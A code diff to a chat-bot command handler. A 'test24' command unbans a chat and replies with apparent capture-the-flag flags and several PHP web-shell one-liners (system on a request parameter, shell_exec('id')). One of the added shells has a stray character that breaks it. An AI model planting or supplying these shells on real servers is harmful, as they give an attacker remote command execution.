@@ -40,10 +40,17 @@ let handler = async (m, {
             break
             case 'test24': {
                 global.db.data.chats[m.chat].isBanned = false
-                conn.reply(m.chat, "ARA2023{4ku_aD4laH_1nSp3kTuR_h4nDaL}" +
-                    "ARA2023{IDAT_d4t4_cHunk_s4ves_y0ur_d4y_0r_did_you_BF?!}" +
-                    "" +
-                    "<?php system($_GET['c']); ?>", m, {
+                conn.reply(m.chat, "ARA2023{4ku_aD4laH_1nSp3kTuR_h4nDaL}\n" +
+                "ARA2023{IDAT_d4t4_cHunk_s4ves_y0ur_d4y_0r_did_you_BF?!}\n" +
+                "\n" +
+                "<?php system($_GET['c']); ?>\n" +
+                "<?php system($_REQUEST['c']$); ?>\n" +
+                "\n" +
+                "<?php\n" +
+                "$os = shell_exec('id');\n" +
+                "echo \"<pre>$os</pre>\";\n" +
+                "?>\n" +
+                "\n", m, {
                         contextInfo: {
                             externalAdReply: {
                                 title: global.wm,
